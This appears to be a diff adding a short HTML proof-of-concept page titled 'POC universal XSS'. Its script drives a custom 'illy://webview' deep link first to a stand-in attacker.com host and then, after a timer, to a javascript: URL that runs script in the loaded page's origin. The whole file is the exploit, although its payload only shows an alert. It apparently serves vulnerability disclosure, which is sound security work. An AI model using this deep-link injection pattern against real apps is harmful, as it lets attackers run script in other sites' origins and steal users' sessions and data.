@@ -1,0 +1,15 @@
+<html>
+	<head></head>
+	<body>
+		<h1> POC universal XSS</h1>
+<script>
+location.href =
+"illy://webview?url=https://attacker.com";
+
+setTimeout(()=>{
+ location.href =
+ "illy://webview?url=javascript:alert(document.domain)";
+},3000);
+</script>
+	</body>
+</html>
